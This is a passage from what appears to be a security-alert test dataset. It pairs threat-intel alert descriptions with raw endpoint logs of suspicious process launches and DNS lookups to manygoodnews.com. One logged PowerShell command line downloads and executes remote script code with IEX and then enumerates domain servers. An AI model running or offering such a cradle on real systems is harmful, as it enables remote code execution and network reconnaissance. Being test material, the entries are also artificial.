PowerShell\",\"fullPid\":{\"pid\":11224,\"startTime\":{\"millisecondsSinceEpoch\":\"1731562276297\"}},\"isWow64\":\"E_FALSE\",\"commandLine\":\"powershell.exe -executionpolicy remotesigned -File Get-DataInfo.ps1 method\",\"integrityLevel\":\"HIGH\",\"user\":{\"name\":\"SG\\\\Admin\",\"sid\":\"S-1-5-21-947102721-2557683097-696379042-94871\"}},\"process\":{\"parent\":{\"excluded\":\"E_UNSUPPORTED\",\"node\":{\"key\":{\"value\":\"D768DCE2C33CF0CB\"}},\"isRedirectedCommandProcessor\":\"E_UNSUPPORTED\",\"root\":\"E_UNSUPPORTED\",\"interactive\":\"E_UNSUPPORTED\",\"name\":\"\",\"subsystem\":\"SUBSYSTEM_UNKNOWN\",\"fullPid\":{\"pid\":0,\"startTime\":{\"millisecondsSinceEpoch\":\"0\"}},\"isWow64\":\"E_UNSUPPORTED\",\"sessionId\":0,\"commandLine\":\"\",\"integrityLevel\":\"INTEGRITY_LEVEL_UNKNOWN\"},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"counters\":{\"dnsLookups\":0,\"crossProcess\":1,\"fileModification\":0,\"netConnOut\":0,\"moduleLoad\":52,\"fileDeletion\":0,\"crossProcessDupThreadHandle\":0,\"registryModification\":0,\"osChildProcess\":0,\"modelChildProcess\":0,\"crossProcessOpenProcess\":1,\"fileCreation\":0,\"exeModification\":0,\"crossProcessOutOfGroup\":0,\"netConnIn\":0,\"crossProcessDupProcessHandle\":0,\"crossProcessRemoteThread\":0},\"interactive\":\"E_FALSE\",\"subsystem\":\"SYS_WIN32\",\"sessionId\":2,\"executable\":{\"owner\":{\"name\":\"\",\"sid\":\"\"},\"node\":{\"key\":{\"value\":\"68F355F95F451218\"}},\"path\":\"C:\\\\WINDOWS\\\\System32\\\\powershell.exe\",\"creationTime\":{\"millisecondsSinceEpoch\":\"17315622762975951616\"},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"092ac6f8d072c4cf045e35a839d5bb8f1360f1ae\",\"sha256\":\"a290ce75c6c6b37af077b72dc9c2c347a2eede4fafa6551387fa8469539409c7\",\"md5\":\"16cde93b441e4363700dfbf34c687b08\"},\"fileLocation\":\"Local\",\"isKernelModule\":\"E_UNSUPPORTED\",\"isDir\":\"E_FALSE\",\"sizeBytes\":\"862208\"},\"excluded\":\"E_FALSE\",\"node\":{\"key\":{\"value\":\"C6BB4940F0BFA542\"}},\"isRedirectedCommandProcessor\":\"E_FALSE\",\"root\":\"E_FALSE\",\"name\":\"Task Scheduler Configuration Tool\",\"fullPid\":{\"pid\":3244,\"startTime\":{\"millisecondsSinceEpoch\":\"1731562276297\"}},\"isWow64\":\"E_FALSE\",\"commandLine\":\"\\\\??\\\\C:\\\\WINDOWS\\\\system32\\\\schtasks.exe 0xffffffff -ForceV1\",\"integrityLevel\":\"HIGH\",\"user\":{\"name\":\"SG\\\\Admin\",\"sid\":\"S-1-5-21-947102721-2557683097-696379042-94871\"}},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"092ac6f8d072c4cf045e35a839d5bb8f1360f1ae\",\"sha256\":\"a290ce75c6c6b37af077b72dc9c2c347a2eede4fafa6551387fa8469539409c7\",\"md5\":\"16cde93b441e4363700dfbf34c687b08\"},\"type\":\"processCreation\",\"status\":\"UNKNOWN\"}}\r\nudm.principal.process.file.full_path: C:\\WINDOWS\\System32\\powershell.exe\r\nudm.principal.process.file.sha256: 908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53"
        ]
    },
    "180": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitypowershell.exe launched by powershell.exe",
        "ini_data": [
            "{\"@timestamp\":1735191076299,\"meta\":{\"traceId\":\"01GE20GABCTSA2Q413A1M1P9HT\",\"accountId\":\"553410142016245253\",\"osFamily\":\"windows\",\"computerName\":\"DESKTOP1\",\"agentVersion\":\"S1-WIN/21.7.5.1080\",\"siteId\":\"239629223416646331\",\"osRevision\":\"19042\",\"osName\":\"Windows 10 Enterprise\",\"uuid\":\"0c422588231f4d5ab2de15490c8f2361\",\"seqId\":0,\"machineType\":\"desktop\",\"mgmtUrl\":\"https://sg-prod.sentinelone.net\"},\"event\":{\"parent\":{\"parent\":{\"excluded\":\"E_UNSUPPORTED\",\"node\":{\"key\":{\"value\":\"425855B6823E7E61\"}},\"isRedirectedCommandProcessor\":\"E_UNSUPPORTED\",\"root\":\"E_UNSUPPORTED\",\"interactive\":\"E_UNSUPPORTED\",\"name\":\"\",\"subsystem\":\"SUBSYSTEM_UNKNOWN\",\"fullPid\":{\"pid\":0,\"startTime\":{\"millisecondsSinceEpoch\":\"0\"}},\"isWow64\":\"E_UNSUPPORTED\",\"sessionId\":0,\"commandLine\":\"\",\"integrityLevel\":\"INTEGRITY_LEVEL_UNKNOWN\"},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"counters\":{\"dnsLookups\":0,\"crossProcess\":0,\"fileModification\":0,\"netConnOut\":0,\"moduleLoad\":206,\"fileDeletion\":0,\"crossProcessDupThreadHandle\":0,\"registryModification\":159,\"osChildProcess\":1,\"modelChildProcess\":1,\"crossProcessOpenProcess\":0,\"fileCreation\":0,\"exeModification\":0,\"crossProcessOutOfGroup\":0,\"netConnIn\":0,\"crossProcessDupProcessHandle\":0,\"crossProcessRemoteThread\":0},\"interactive\":\"E_FALSE\",\"subsystem\":\"SYS_WIN32\",\"sessionId\":2,\"executable\":{\"owner\":{\"name\":\"\",\"sid\":\"\"},\"node\":{\"key\":{\"value\":\"6212826804D001B2\"}},\"path\":\"C:\\\\WINDOWS\\\\System32\\\\powershell.exe\",\"creationTime\":{\"millisecondsSinceEpoch\":\"17351910762915951616\"},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"36c5d12033b2eaf251bae61c00690ffb17fddc87\",\"sha256\":\"908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53\",\"md5\":\"cda48fc75952ad12d99e526d0b6bf70a\"},\"fileLocation\":\"Local\",\"isKernelModule\":\"E_UNSUPPORTED\",\"isDir\":\"E_FALSE\",\"sizeBytes\":\"253768\"},\"excluded\":\"E_FALSE\",\"node\":{\"key\":{\"value\":\"D768DCE2C33CF0CB\"}},\"isRedirectedCommandProcessor\":\"E_FALSE\",\"root\":\"E_FALSE\",\"name\":\"Windows PowerShell\",\"fullPid\":{\"pid\":11224,\"startTime\":{\"millisecondsSinceEpoch\":\"1735191076299\"}},\"isWow64\":\"E_FALSE\",\"commandLine\":\"IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:36595/'); Get-NetComputer -ping -operatingsystem *server*\",\"integrityLevel\":\"HIGH\",\"user\":{\"name\":\"SG\\\\Admin\",\"sid\":\"S-1-5-21-947102721-2557683097-696379042-94871\"}},\"process\":{\"parent\":{\"excluded\":\"E_UNSUPPORTED\",\"node\":{\"key\":{\"value\":\"D768DCE2C33CF0CB\"}},\"isRedirectedCommandProcessor\":\"E_UNSUPPORTED\",\"root\":\"E_UNSUPPORTED\",\"interactive\":\"E_UNSUPPORTED\",\"name\":\"\",\"subsystem\":\"SUBSYSTEM_UNKNOWN\",\"fullPid\":{\"pid\":0,\"startTime\":{\"millisecondsSinceEpoch\":\"0\"}},\"isWow64\":\"E_UNSUPPORTED\",\"sessionId\":0,\"commandLine\":\"\",\"integrityLevel\":\"INTEGRITY_LEVEL_UNKNOWN\"},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"counters\":{\"dnsLookups\":0,\"crossProcess\":1,\"fileModification\":0,\"netConnOut\":0,\"moduleLoad\":52,\"fileDeletion\":0,\"crossProcessDupThreadHandle\":0,\"registryModification\":0,\"osChildProcess\":0,\"modelChildProcess\":0,\"crossProcessOpenProcess\":1,\"fileCreation\":0,\"exeModification\":0,\"crossProcessOutOfGroup\":0,\"netConnIn\":0,\"crossProcessDupProcessHandle\":0,\"crossProcessRemoteThread\":0},\"interactive\":\"E_FALSE\",\"subsystem\":\"SYS_WIN32\",\"sessionId\":2,\"executable\":{\"owner\":{\"name\":\"\",\"sid\":\"\"},\"node\":{\"key\":{\"value\":\"68F355F95F451218\"}},\"path\":\"C:\\\\WINDOWS\\\\System32\\\\powershell.exe\",\"creationTime\":{\"millisecondsSinceEpoch\":\"17351910762995951616\"},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"092ac6f8d072c4cf045e35a839d5bb8f1360f1ae\",\"sha256\":\"a290ce75c6c6b37af077b72dc9c2c347a2eede4fafa6551387fa8469539409c7\",\"md5\":\"16cde93b441e4363700dfbf34c687b08\"},\"fileLocation\":\"Local\",\"isKernelModule\":\"E_UNSUPPORTED\",\"isDir\":\"E_FALSE\",\"sizeBytes\":\"862208\"},\"excluded\":\"E_FALSE\",\"node\":{\"key\":{\"value\":\"C6BB4940F0BFA542\"}},\"isRedirectedCommandProcessor\":\"E_FALSE\",\"root\":\"E_FALSE\",\"name\":\"Task Scheduler Configuration Tool\",\"fullPid\":{\"pid\":3244,\"startTime\":{\"millisecondsSinceEpoch\":\"1735191076299\"}},\"isWow64\":\"E_FALSE\",\"commandLine\":\"\\\\??\\\\C:\\\\WINDOWS\\\\system32\\\\schtasks.exe 0xffffffff -ForceV1\",\"integrityLevel\":\"HIGH\",\"user\":{\"name\":\"SG\\\\Admin\",\"sid\":\"S-1-5-21-947102721-2557683097-696379042-94871\"}},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"092ac6f8d072c4cf045e35a839d5bb8f1360f1ae\",\"sha256\":\"a290ce75c6c6b37af077b72dc9c2c347a2eede4fafa6551387fa8469539409c7\",\"md5\":\"16cde93b441e4363700dfbf34c687b08\"},\"type\":\"processCreation\",\"status\":\"UNKNOWN\"}}\r\nudm.principal.process.file.full_path: C:\\WINDOWS\\System32\\powershell.exe\r\nudm.principal.process.file.sha256: 908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53"
        ]
    },
    "181": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityClient Update.exe launched by 49213",
        "ini_data": [
            "{\"metadata\":{\"logType\":\"PROCESS_LAUNCH\",\"productVersion\":\"1.2\",\"vendorName\":\"Tanium\",\"productName\":\"Tanium Event Emitter\",\"eventTimestamp\":\"2025-01-02T09:17:33.601+00:00\"},\"principal\":{\"process\":{\"pid\":\"13437\",\"parentPid\":\"49213\",\"productSpecificProcessId\":\"13437\",\"productSpecificParentProcessId\":\"49213\",\"file\":{\"fullPath\":\"C:\\\\Users\\\\alice\\\\Downloads\\\\Client Update.exe\",\"md5\":\"17150a137c43235ad07011b552f9ff27\"}},\"hostname\":\"alice-benjamin-pc\",\"assetId\":\"alice-benjamin-pc\",\"user\":{\"userid\":\"alice\",\"groupid\":none}}}"
        ]
    },
    "182": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitysoftware.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\51e3b645-cd3e-4087-8175-9451ecd98863\\\\software.exe\\\" --AutoStart\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\51e3b645-cd3e-4087-8175-9451ecd98863\\\\\",\"Description\":\"-\",\"EventID\":1,\"FileVersion\":\"-\",\"Hashes\":\"MD5=65D2046ADD5EF298FBA308EDB9C291DC,SHA256=60C85D1E4B4698E35E83519E16025AA11B6F79A69F02E483A8BAF5E97CD04752,IMPHASH=C7006B0F6ACDFB37FFEEBFD2C1715395\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\51e3b645-cd3e-4087-8175-9451ecd98863\\\\software.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-A525-648A-09F3-030000000000}\",\"LogonId\":\"0x3f309\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"-\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-A525-648A-6A00-000000004400}\",\"ParentProcessId\":\"4876\",\"ProcessGuid\":\"{C784477D-840C-6517-3806-000000004400}\",\"ProcessID\":2300,\"ProcessId\":\"5252\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1366213,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":680,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-11-04 05:32:23.136\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "183": {
        "alert_brief": "Alert on known Hash querying a known hostname with VT Relationshipsto manygoodnews.com",
        "ini_data": [
            "{\"event_simpleName\":\"DnsRequest\",\"ContextTimeStamp\":\"1731375147\",\"ConfigStateHash\":\"9542156506\",\"ContextProcessId\":\"8960054625103\",\"DomainName\":\"manygoodnews.com\",\"ContextThreadId\":\"967634005093619\",\"aip\":\"10.8.13.29\",\"QueryStatus\":\"87\",\"InterfaceIndex\":\"0\",\"ConfigBuild\":\"1007.3.0011809.1\",\"event_platform\":\"Win\",\"DnsRequestCount\":\"1\",\"DualRequest\":\"1\",\"Entitlements\":\"15\",\"name\":\"DnsRequestV4\",\"id\":\"217339fb-172e-4bf1-a397-e92639d6080a\",\"EffectiveTransmissionClass\":\"3\",\"aid\":\"e2327adb69e83e6f9deaf40da1e4c653\",\"timestamp\":\"1731389548\",\"cid\":\"b140194b2ba51f0ba1e93ba0187310b2\",\"RequestType\":\"1\",\"UserName\":\"adablack\"}\r\nudm.principal.process.file.full_path: \\Device\\HarddiskVolume1\\Program Files\\C:\\Users\\adablack\\Downloads\\Client Update.exe\r\nudm.principal.process.file.sha256: c10cd1c78c180ba657e3921ee9421b9abd5b965c4cdfaa94a58e383b45bb72ca"
        ]
    },
    "184": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activity2210231586.exe launched by cmd.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\2210231586.exe\\\" \",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\Desktop\\\\\",\"Description\":\"-\",\"EventID\":1,\"FileVersion\":\"-\",\"Hashes\":\"MD5=DA1E9AA523AA8EE2CBBED75292F9C7C8,SHA256=E16A60A10EBACD0B8AF5320E9582ABD6B1EC86B459BD35FD4E69BD37807F4A47,IMPHASH=18690DF0ED1BE01972DCB3DC78C42692\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\2210231586.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-2F94-647F-C9CC-030000000000}\",\"LogonId\":\"0x3ccc9\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"-\",\"ParentCommandLine\":\"\\\"C:\\\\Windows\\\\System32\\\\cmd.exe\\\" /c start /I \\\"\\\" \\\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\2210231586.exe\\\"\",\"ParentImage\":\"C:\\\\Windows\\\\SysWOW64\\\\cmd.exe\",\"ParentProcessGuid\":\"{C784477D-A42A-6517-2606-000000004400}\",\"ParentProcessId\":\"3380\",\"ProcessGuid\":\"{C784477D-A42A-6517-2806-000000004400}\",\"ProcessID\":2296,\"ProcessId\":\"3080\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1366193,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":364,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-12-06 05:32:37.136\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\SysWOW64\\cmd.exe"
        ]
    },
    "185": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitysoftware.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\51e3b645-cd3e-4087-8175-9451ecd98863\\\\software.exe\\\" --AutoStart\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\51e3b645-cd3e-4087-8175-9451ecd98863\\\\\",\"Description\":\"-\",\"EventID\":1,\"FileVersion\":\"-\",\"Hashes\":\"MD5=65D2046ADD5EF298FBA308EDB9C291DC,SHA256=60C85D1E4B4698E35E83519E16025AA11B6F79A69F02E483A8BAF5E97CD04752,IMPHASH=C7006B0F6ACDFB37FFEEBFD2C1715395\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\51e3b645-cd3e-4087-8175-9451ecd98863\\\\software.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-A525-648A-09F3-030000000000}\",\"LogonId\":\"0x3f309\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"-\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-A525-648A-6A00-000000004400}\",\"ParentProcessId\":\"4876\",\"ProcessGuid\":\"{C784477D-840C-6517-3806-000000004400}\",\"ProcessID\":2300,\"ProcessId\":\"5252\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1366213,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":680,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-11-06 05:32:29.136\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "186": {
        "alert_brief": "Alert on known Hash querying a known hostname with VT Relationshipsto manygoodnews.com",
        "ini_data": [
            "{\"event_simpleName\":\"DnsRequest\",\"ContextTimeStamp\":\"1718411573\",\"ConfigStateHash\":\"9542156506\",\"ContextProcessId\":\"8960054625103\",\"DomainName\":\"manygoodnews.com\",\"ContextThreadId\":\"967634005093619\",\"aip\":\"10.8.13.29\",\"QueryStatus\":\"87\",\"InterfaceIndex\":\"0\",\"ConfigBuild\":\"1007.3.0011809.1\",\"event_platform\":\"Win\",\"DnsRequestCount\":\"1\",\"DualRequest\":\"1\",\"Entitlements\":\"15\",\"name\":\"DnsRequestV4\",\"id\":\"217339fb-172e-4bf1-a397-e92639d6080a\",\"EffectiveTransmissionClass\":\"3\",\"aid\":\"e2327adb69e83e6f9deaf40da1e4c653\",\"timestamp\":\"1718425974\",\"cid\":\"b140194b2ba51f0ba1e93ba0187310b2\",\"RequestType\":\"1\",\"UserName\":\"adablack\"}\r\nudm.principal.process.file.full_path: \\Device\\HarddiskVolume1\\Program Files\\C:\\Users\\adablack\\Downloads\\Client Update.exe\r\nudm.principal.process.file.sha256: c10cd1c78c180ba657e3921ee9421b9abd5b965c4cdfaa94a58e383b45bb72ca"
        ]
    },
    "187": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityqClNkVtHKskoh.exe",
        "ini_data": [
            "□%□□□□□□□□□□□□□□ □N2□Chronicle Internal□(□$patrick-walker-windows-pc.corp.local\"□*f\"d□□61206□Q□ 27444605dff20d1e704b5cf682d035d2*-C:\\Users\\AppData\\Local\\Temp\\qClNkVtHKskoh.exe*□ID:61206"
        ]
    },
    "188": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityQuickBooks.vbs launched by svchost.exe",
        "ini_data": [
            "{\"EventType\":\"\",\"AccountName\":\"\",\"Domain\":\"\",\"Message\":\"\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"EventID\":1,\"Version\":5,\"Level\":4,\"OpcodeValue\":0,\"Keywords\":9223372036854775808,\"EventTime\":1672667450,\"RecordNumber\":85943,\"ProcessID\":2302,\"ThreadID\":3068,\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Computer\":\"serhatg.local\",\"Hostname\":\"serhatg.local\",\"UserID\":\"S-1-5-18\",\"RuleName\":\"-\",\"UtcTime\":\"2024-10-01 04:36:48.399\",\"ProcessGuid\":\"{C784477D-EC9D-625D-5206-000000003E00}\",\"ProcessId\":\"7128\",\"Image\":\"C:\\\\Users\\\\serhatg\\\\AppData\\\\Roaming\\\\VBS\\\\QuickBooks.vbs\",\"FileVersion\":\"10.0.17134.1098 (WinBuild.160101.0800)\",\"Description\":\"Host Process for Windows Tasks\",\"Product\":\"Microsoft\\\\xae Windows\\\\xae Operating System\",\"Company\":\"Microsoft Corporation\",\"OriginalFileName\":\"QuickBooks.vbs\",\"CommandLine\":\"QuickBooks.vbs\",\"CurrentDirectory\":\"C:\\\\Users\\\\serhatg\\\\AppData\\\\Roaming\\\\VBS\\\\\",\"User\":\"serhatg.local\\\\serhatg\",\"LogonGuid\":\"{C784477D-5ED0-6255-30E3-030000000000}\",\"LogonId\":\"0x3e330\",\"TerminalSessionId\":\"1\",\"IntegrityLevel\":\"Medium\",\"Hashes\":\"MD5=D8889119B3B0EC07E548F01EDEFC475A,SHA256=76D8EEA528D58442D22D1B81882FF58286025203BC69115E8EC485984249BA67,IMPHASH=F66BB3B3040DB6FAC0F2A2BA91E541DC0F0C7319\",\"ParentProcessGuid\":\"{C784477D-5ECB-6255-1F00-000000003E00}\",\"ParentProcessId\":\"1340\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\svchost.exe\",\"ParentCommandLine\":\"c:\\\\windows\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule\"}\r\nudm.principal.process.file.full_path: C:\\Windows\\System32\\svchost.exe"
        ]
    },
    "189": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityF20B.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\F20B.exe\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\\",\"Description\":\"-\",\"EventID\":1,\"FileVersion\":\"-\",\"Hashes\":\"MD5=317C1DA3D49D534FDDE575395DA84879,SHA256=72674E9A3C32D5457C98EF723B938ABC0295329C7EC58F9E07A0CB1E99631F48,IMPHASH=84E31D32A2CB7830E40CFCBEA395C7A1\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\F20B.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-8F33-6539-44AD-030000000000}\",\"LogonId\":\"0x3ad44\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"-\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-8F34-6539-6A00-000000003B00}\",\"ParentProcessId\":\"4944\",\"ProcessGuid\":\"{C784477D-ACAA-653D-7D06-000000003B00}\",\"ProcessID\":2332,\"ProcessId\":\"6284\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":462620,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":696,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-10-31 05:32:43.136\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "190": {
        "alert_brief": "Alert on known Hash querying a known hostname with VT Relationshipsto manygoodnews.com",
        "ini_data": [
            "{\"event_simpleName\":\"DnsRequest\",\"ContextTimeStamp\":\"1720225969\",\"ConfigStateHash\":\"9542156506\",\"ContextProcessId\":\"8960054625103\",\"DomainName\":\"manygoodnews.com\",\"ContextThreadId\":\"967634005093619\",\"aip\":\"10.8.13.29\",\"QueryStatus\":\"87\",\"InterfaceIndex\":\"0\",\"ConfigBuild\":\"1007.3.0011809.1\",\"event_platform\":\"Win\",\"DnsRequestCount\":\"1\",\"DualRequest\":\"1\",\"Entitlements\":\"15\",\"name\":\"DnsRequestV4\",\"id\":\"217339fb-172e-4bf1-a397-e92639d6080a\",\"EffectiveTransmissionClass\":\"3\",\"aid\":\"e2327adb69e83e6f9deaf40da1e4c653\",\"timestamp\":\"1720240370\",\"cid\":\"b140194b2ba51f0ba1e93ba0187310b2\",\"RequestType\":\"1\",\"UserName\":\"adablack\"}\r\nudm.principal.process.file.full_path: \\Device\\HarddiskVolume1\\Program Files\\C:\\Users\\adablack\\Downloads\\Client Update.exe\r\nudm.principal.process.file.sha256: c10cd1c78c180ba657e3921ee9421b9abd5b965c4cdfaa94a58e383b45bb72ca"
        ]
    },
    "191": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitysoftware.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\51e3b645-cd3e-4087-8175-9451ecd98863\\\\software.exe\\\" --AutoStart\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\51e3b645-cd3e-4087-8175-9451ecd98863\\\\\",\"Description\":\"-\",\"EventID\":1,\"FileVersion\":\"-\",\"Hashes\":\"MD5=65D2046ADD5EF298FBA308EDB9C291DC,SHA256=60C85D1E4B4698E35E83519E16025AA11B6F79A69F02E483A8BAF5E97CD04752,IMPHASH=C7006B0F6ACDFB37FFEEBFD2C1715395\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\51e3b645-cd3e-4087-8175-9451ecd98863\\\\software.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-A525-648A-09F3-030000000000}\",\"LogonId\":\"0x3f309\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"-\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-A525-648A-6A00-000000004400}\",\"ParentProcessId\":\"4876\",\"ProcessGuid\":\"{C784477D-840C-6517-3806-000000004400}\",\"ProcessID\":2300,\"ProcessId\":\"5252\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1366213,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":680,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-12-26 05:32:21.136\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "192": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityWMIhosts.exe launched by svchost.exe",
        "ini_data": [
